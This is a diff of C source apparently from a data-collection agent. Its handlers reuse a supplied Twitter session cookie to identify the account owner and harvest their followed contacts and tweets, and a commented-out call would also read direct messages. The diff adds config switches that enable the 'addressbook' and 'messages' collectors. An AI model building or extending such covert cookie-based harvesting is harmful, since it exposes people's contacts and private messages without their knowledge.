@@ -7,6 +7,7 @@
 #include "debug.h"
 #include "zmem.h"
 #include "JSON.h"
+#include "conf.h"
 
 
 #define TWITTER_FOLLOWER 1
@@ -99,7 +100,7 @@ DWORD ParseFollowing(char *user, char *cookie)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD HandleTwitterContacts(char *cookie)
+DWORD TwitterContactHandler(char *cookie)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -108,6 +109,10 @@ DWORD HandleTwitterContacts(char *cookie)
 	char user[256];
 	WCHAR user_name[256];
 	static BOOL scanned = FALSE;
+
+	if (!ConfIsModuleEnabled(L"addressbook"))
+		return SOCIAL_REQUEST_SUCCESS;
+
 
 #ifdef _DEBUG
 		OutputDebug(L"[*] %S\n", __FUNCTION__);
@@ -563,7 +568,7 @@ DWORD ParseTweet(char *user, char *cookie)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD HandleTwitterTweets(char *cookie)
+DWORD TwitterMessageHandler(char *cookie)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
@@ -572,7 +577,9 @@ DWORD HandleTwitterTweets(char *cookie)
 	char user[256];
 	char userhandle[256];
 
-	
+	if (!ConfIsModuleEnabled(L"messages"))
+		return SOCIAL_REQUEST_SUCCESS;
+
 	// Identifica l'utente
 	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
@@ -615,7 +622,7 @@ DWORD HandleTwitterTweets(char *cookie)
 		}
 	}
 	
-
+	/* uncomment this function to enable dm */
 	//ParseDirectMessages(userhandle, cookie); 
 
 	SAFE_FREE(r_buffer);
